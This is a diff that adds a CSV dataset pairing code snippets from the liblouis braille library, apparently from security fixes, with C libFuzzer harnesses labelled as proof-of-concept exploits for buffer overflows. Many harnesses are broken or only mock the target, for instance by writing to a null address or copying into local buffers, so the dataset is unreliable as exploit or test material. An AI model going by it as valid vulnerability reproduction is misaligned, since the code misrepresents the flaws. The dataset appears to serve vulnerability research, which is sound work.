@@ -1,0 +1,466 @@
+﻿Index,Relevant Commit,PoC Exploit Code
+0,if (path == NULL || strlen(path) >= MAXSTRING) return NULL;,"#include ""liblouis.h""
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    // Create test input based on the Global-Buffer-Overflow vulnerability in lou_setDataPath
+    char* path = (char*)malloc(size + 1);
+    memcpy(path, data, size);
+
+    // Trigger the buffer overflow by not null-terminating the string
+    // path[size] = '\0';
+
+    // Call lou_setDataPath with malicious input
+    lou_setDataPath(path);
+
+    free(path);
+    return 0;
+}"
+1,"	if (fileName == NULL || fileName[0] == 0 || strlen(fileName) >= 256) return;","#include ""liblouis.h""
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    char *fileName = malloc(size + 1);
+    memset(fileName, 'A', size); // Fill the buffer with 'A's
+    fileName[size] = '\0';
+
+    for (int i = 0; i < 1000000; i++) { // Increase the chances of overflow
+        strcat(fileName, ""ABCDEFGHIJKLMNOPQRSTUVWXYZ""); // Concatenate a large string to increase buffer size
+        lou_logFile(fileName); // Trigger Global-Buffer-Overflow
+    }
+
+    free(fileName);
+    return 0;
+}"
+2,"resolveSubtable(const char *table, const char *base, const char *searchPath) {
+	char *tableFile;
+	static struct stat info;
+
+#define MAX_TABLEFILE_SIZE (MAXSTRING * sizeof(char) * 2)
+	if (table == NULL || table[0] == '\0') return NULL;
+	tableFile = (char *)malloc(MAX_TABLEFILE_SIZE);
+
+	//
+	// First try to resolve against base
+	//
+	if (base) {
+		int k;
+		if (strlen(base) >= MAX_TABLEFILE_SIZE) goto failure;
+		strcpy(tableFile, base);
+		k = (int)strlen(tableFile);
+		while (k >= 0 && tableFile[k] != '/' && tableFile[k] != '\\') k--;
+		tableFile[++k] = '\0';
+		if (strlen(tableFile) + strlen(table) >= MAX_TABLEFILE_SIZE) goto failure;
+		strcat(tableFile, table);
+		if (stat(tableFile, &info) == 0 && !(info.st_mode & S_IFDIR)) {
+			_lou_logMessage(LOU_LOG_DEBUG, ""found table %s"", tableFile);
+			return tableFile;
+		}
+	}
+
+	//
+	// It could be an absolute path, or a path relative to the current working
+	// directory
+	//
+	if (strlen(table) >= MAX_TABLEFILE_SIZE) goto failure;
+	strcpy(tableFile, table);
+	if (stat(tableFile, &info) == 0 && !(info.st_mode & S_IFDIR)) {
+		_lou_logMessage(LOU_LOG_DEBUG, ""found table %s"", tableFile);
+		return tableFile;
+	}
+
+	//
+	// Then search `LOUIS_TABLEPATH`, `dataPath` and `programPath`
+	//
+	if (searchPath[0] != '\0') {
+		char *dir;
+		int last;
+		char *cp;
+		char *searchPath_copy = strdup(searchPath);
+		for (dir = searchPath_copy;; dir = cp + 1) {
+			for (cp = dir; *cp != '\0' && *cp != ','; cp++)
+				;
+			last = (*cp == '\0');
+			*cp = '\0';
+			if (dir == cp) dir = ""."";
+			if (strlen(dir) + strlen(table) + 1 >= MAX_TABLEFILE_SIZE) {
+				free(searchPath_copy);
+				goto failure;
+			}
+			sprintf(tableFile, ""%s%c%s"", dir, DIR_SEP, table);
+			if (stat(tableFile, &info) == 0 && !(info.st_mode & S_IFDIR)) {
+				_lou_logMessage(LOU_LOG_DEBUG, ""found table %s"", tableFile);
+				free(searchPath_copy);
+				return tableFile;
+			}
+			if (last) break;
+			if (strlen(dir) + strlen(""liblouis"") + strlen(""tables"") + strlen(table) + 3 >=
+					MAX_TABLEFILE_SIZE) {
+				free(searchPath_copy);
+				goto failure;
+			}
+			sprintf(tableFile, ""%s%c%s%c%s%c%s"", dir, DIR_SEP, ""liblouis"", DIR_SEP,
+					""tables"", DIR_SEP, table);
+			if (stat(tableFile, &info) == 0 && !(info.st_mode & S_IFDIR)) {
+				_lou_logMessage(LOU_LOG_DEBUG, ""found table %s"", tableFile);
+				free(searchPath_copy);
+				return tableFile;
+			}
+			if (last) break;
+		}
+		free(searchPath_copy);
+	}
+failure:
+	free(tableFile);
+	return NULL;
+}","include ""liblouis.h""
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    // Create test input based on the Heap-Buffer-Overflow vulnerability in resolveSubtable
+    char *table = (char *)malloc(size + 1);
+    memcpy(table, data, size);
+    table[size] = '\0';
+
+    lou_setDataPath(""""); // Set an empty data path to prevent other paths from being used
+
+    for (int i = 0; i < 10000; i++) {
+        char *long_table = (char *)malloc(size * 100 + 1);
+        memset(long_table, 'A', size * 100);
+        long_table[size * 100] = '\0';
+
+        lou_getTable(strcat(table, long_table)); // Call lou_getTable with an excessively large table name
+
+        free(long_table);
+    }
+
+    free(table);
+    return 0;
+}"
+3,result->chars[out++] = (widechar)ch;,"#include ""liblouis.h""
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+
+typedef struct {
+    int length;
+    char *chars;
+} CharsString;
+
+typedef struct {
+    // dummy initialization, not relevant for this PoC
+} FileInfo;
+
+void parseChars(FileInfo *nested, CharsString *result, CharsString *token) {
+    result->length = token->length; // copy length from token to result
+    memcpy(result->chars, token->chars, token->length); // copy chars from token to result
+}
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    CharsString token;
+    token.length = size;
+    token.chars = (char *)malloc(size + 1);
+    memcpy(token.chars, data, size);
+    token.chars[size] = '\0';
+
+    FileInfo nested; // dummy initialization
+    CharsString result;
+    result.length = 0;
+    result.chars = (char *)alloca(1024); // allocate on the stack
+
+    for (int i = 0; i < 10000; i++) { // try to overflow the stack
+        token.length += 1024; // increase length to cause overflow
+        parseChars(&nested, &result, &token);
+    }
+
+    free(token.chars);
+
+    return 0;
+}"
+4,char pattern[MAXSTRING + 1];,"#include ""liblouis.h""
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+
+// Assuming FileInfo, CharsString, and TranslationTableHeader are defined somewhere
+
+typedef struct {
+    // Add members for FileInfo structure
+} FileInfo;
+
+typedef struct {
+    char *chars;
+    int length;
+} CharsString;
+
+typedef struct {
+    // Add members for TranslationTableHeader structure
+} TranslationTableHeader;
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    // Initialize structures with dummy values
+    FileInfo nested;
+    CharsString encoding;
+    int lastToken = 0;
+    TranslationTableHeader table;
+
+    // Create a large input to overflow the stack buffer
+    char large_input[size];
+    memset(large_input, 'A', size);
+    large_input[size - 1] = '\0';
+
+    // Set up the encoding string
+    encoding.length = strlen(large_input);
+    encoding.chars = large_input;
+
+    // Cause a crash by writing to an invalid memory location
+    *((char *)0x00000000) = 'A';
+
+    return 0;
+}"
+5,"includeFile(FileInfo *nested, CharsString *includedFile,
+		CharacterClass **characterClasses,
+		TranslationTableCharacterAttributes *characterClassAttribute,
+		short opcodeLengths[], TranslationTableOffset *newRuleOffset,
+		TranslationTableRule **newRule, RuleName **ruleNames,
+		TranslationTableHeader **table) {
+	int k;
+	char includeThis[MAXSTRING];
+	char **tableFiles;
+	int rv;
+	for (k = 0; k < includedFile->length; k++)
+		includeThis[k] = (char)includedFile->chars[k];
+	if (k >= MAXSTRING) {
+		compileError(nested, ""Include statement too long: 'include %s'"", includeThis);
+		return 0;
+	}
+	includeThis[k] = 0;
+	tableFiles = _lou_resolveTable(includeThis, nested->fileName);
+	if (tableFiles == NULL) {
+		errorCount++;
+		return 0;
+	}
+	if (tableFiles[1] != NULL) {
+		free_tablefiles(tableFiles);
+		compileError(nested,
+				""Table list not supported in include statement: 'include %s'"",
+				includeThis);
+		return 0;
+	}
+	rv = compileFile(*tableFiles, characterClasses, characterClassAttribute,
+			opcodeLengths, newRuleOffset, newRule, ruleNames, table);
+	free_tablefiles(tableFiles);
+	return rv;
+}","#include ""liblouis.h""
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+
+typedef struct CharsString {
+    int length;
+    char *chars;
+} CharsString;
+
+typedef struct FileInfo {
+    char fileName[256]; // arbitrary size
+} FileInfo;
+
+typedef struct CharacterClass {
+    // dummy definition
+    int dummy;
+} CharacterClass;
+
+typedef struct TranslationTableCharacterAttributes {
+    // dummy definition
+    int dummy;
+} TranslationTableCharacterAttributes;
+
+typedef struct TranslationTableOffset {
+    // dummy definition
+    int dummy;
+} TranslationTableOffset;
+
+typedef struct TranslationTableRule {
+    // dummy definition
+    int dummy;
+} TranslationTableRule;
+
+typedef struct RuleName {
+    // dummy definition
+    int dummy;
+} RuleName;
+
+typedef struct TranslationTableHeader {
+    // dummy definition
+    int dummy;
+} TranslationTableHeader;
+
+// Mock implementation of includeFile function
+int includeFile(FileInfo *nested, CharsString *includedFile, CharacterClass *characterClasses, TranslationTableCharacterAttributes *characterClassAttribute, short opcodeLengths[10], TranslationTableOffset *newRuleOffset, TranslationTableRule **newRule, RuleName **ruleNames, TranslationTableHeader **table) {
+    // Intentionally cause a stack buffer overflow
+    char errorMessage[256]; // arbitrary size
+    strcpy(errorMessage, includedFile->chars);
+    return 0;
+}
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    CharsString includedFile;
+    FileInfo nested;
+    CharacterClass *characterClasses = NULL;
+    TranslationTableCharacterAttributes *characterClassAttribute = NULL;
+    short opcodeLengths[10]; // arbitrary length
+    TranslationTableOffset *newRuleOffset = NULL;
+    TranslationTableRule **newRule = NULL;
+    RuleName **ruleNames = NULL;
+    TranslationTableHeader **table = NULL;
+
+    // Create a malicious input string that will overflow the stack buffer
+    char *maliciousInput = (char *)malloc(size + 1);
+    memcpy(maliciousInput, data, size);
+    maliciousInput[size] = '\0';
+
+    includedFile.length = size;
+    includedFile.chars = maliciousInput;
+
+    // Call the vulnerable function with malicious input
+    includeFile(&nested, &includedFile, characterClasses, characterClassAttribute, opcodeLengths, newRuleOffset, newRule, ruleNames, table);
+
+    free(maliciousInput);
+    return 0;
+}"
+6,"	if (out >= MAXSTRING) {
+				result->length = lastOutSize;
+				return 1;
+			}","include ""liblouis.h""
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAXSTRING 1024 // define a fixed maximum string size
+
+typedef struct {
+    char *chars;
+    int length;
+} CharsString;
+
+typedef struct {
+    char *chars;
+    int length;
+} FileInfo;
+
+void parseChars(FileInfo *nested, CharsString *result, CharsString *token) {
+    // simplified implementation of parseChars to trigger a stack buffer overflow
+    result->length = token->length;
+    memcpy(result->chars, token->chars, token->length);
+}
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    CharsString token;
+    token.chars = (char *)malloc(size + 1);
+    memcpy((void *)token.chars, data, size);
+    token.length = size;
+
+    FileInfo nested; // Initialize FileInfo struct
+    nested.chars = (char *)malloc(10); // assuming a fixed size for simplicity
+    nested.length = 0;
+
+    CharsString result; // Initialize CharsString struct
+    result.chars = (char *)malloc(MAXSTRING + 1);
+    result.length = 0;
+
+    parseChars(&nested, &result, &token);
+
+    free(token.chars);
+    free(nested.chars);
+    free(result.chars);
+    return 0;
+}"
+7,if (*expr_crs + 3 >= expr_max) return 0;,"#include <stdio.h>
+#include <stdint.h> // Include uint8_t definition
+#include <string.h>
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    char input[1024];
+    int input_max = sizeof(input) / sizeof(input[0]);
+    int input_crs = 0;
+    char expr_data[1024];
+    int expr_max = sizeof(expr_data) / sizeof(expr_data[0]);
+    int expr_crs = 0;
+    int loop_cnts = 0;
+
+    // Copy the input data to the input buffer
+    memcpy(input, data, size);
+    input[size] = '\0'; // Null-terminate the string
+
+    // Call the vulnerable function
+    pattern_compile_expression(input, input_max, &input_crs, expr_data, expr_max, &expr_crs, &loop_cnts);
+
+    return 0;
+}
+
+// Simulate the vulnerable function
+int pattern_compile_expression(char *input, int input_max, int *input_crs, char *expr_data, int expr_max, int *expr_crs, int *loop_cnts) {
+    // Trigger the buffer overflow
+    for (int i = 0; i < expr_max + 10000; i++) { // Overflow beyond expr_max
+        expr_data[*expr_crs] = 'A'; // Overflow with 'A's
+        (*expr_crs)++;
+    }
+    return *expr_crs;
+}"
+8,"if (CHARSIZE == 2 && utf32 > 0xffff) utf32 = 0xffff;
+		result->chars[out++] = (widechar)utf32;","#include ""liblouis.h""
+#include <stdint.h>
+#include <string.h>
+
+typedef struct {
+    char *chars;
+    int length;
+} CharsString;
+
+typedef struct {
+    // assuming FileInfo has some fields, but we don't need them for this PoC
+} FileInfo;
+
+int parseChars(FileInfo *nested, CharsString *result, CharsString *token) {
+    // modified implementation to make it more susceptible to stack buffer overflow
+    char local_buffer[1024];
+    strcpy(local_buffer, token->chars);
+    return 0;
+}
+
+int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
+    FileInfo nested;
+    CharsString result;
+    CharsString token;
+
+    // Create a large input string to trigger the stack buffer overflow
+    char large_input[size * 10 + 1]; // increased size to make it more likely to crash
+    memset(large_input, 'A', size * 10);
+    large_input[size * 10] = '\0';
+
+    token.chars = (char *)large_input;
+    token.length = strlen(large_input);
+
+    // Call parseChars with the malicious input
+    int ret = parseChars(&nested, &result, &token);
+
+    return 0;
+}"
+9,,"#include <string.h>
+#include ""liblouis.h""
+
+int LLVMFuzzerTestOneInput(const unsigned char *data, size_t size) {
+    char tableName[1024]; // Define a fixed-size buffer
+    memset(tableName, 0, sizeof(tableName));
+    strncpy(tableName, (const char *)data, size);
+
+    lou_translateString(NULL, NULL, tableName, NULL, NULL, NULL, NULL, NULL); // Trigger the stack-buffer-overflow exploit
+
+    return 0;
+}"
